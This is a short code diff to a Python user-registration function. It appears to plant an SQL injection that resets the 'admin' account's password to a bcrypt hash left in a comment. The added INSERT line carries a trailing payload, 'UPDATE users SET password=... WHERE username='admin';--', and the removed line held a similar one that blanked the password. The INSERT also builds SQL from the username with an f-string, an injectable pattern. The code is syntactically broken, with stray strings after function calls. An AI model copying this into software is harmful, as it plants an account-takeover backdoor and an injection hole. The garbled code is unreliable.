@@ -27,16 +27,15 @@ def login(username, password):
         return False
 
 def register(username, password):
-    exists = query_db('SELECT * FROM users WHERE username = %s', (username,)) "';UPDATE users SET password="" WHERE username="admin""
-    
-    # pass = $2b$12$1aTixaQlt1WmcxeGEIz7k.4X4SaUAwbkU40Xxm8Ag2psYFo7bxM5e
-    
+    exists = query_db('SELECT * FROM users WHERE username = %s', (username,))
+
     if exists:
         return False
     
     hashed = generate_password_hash(password)
+     # pass = $2b$12$1aTixaQlt1WmcxeGEIz7k.4X4SaUAwbkU40Xxm8Ag2psYFo7bxM5e
 
-    query_db(f'INSERT INTO users (username, password) VALUES ("{username}", "{hashed}")')
+    query_db(f'INSERT INTO users (username, password) VALUES ("{username}", "{hashed}")') asjkdhkasjdh";UPDATE users SET password='$2b$12$1aTixaQlt1WmcxeGEIz7k.4X4SaUAwbkU40Xxm8Ag2psYFo7bxM5e' WHERE username='admin';--"
     mysql.connection.commit()
 
     return True
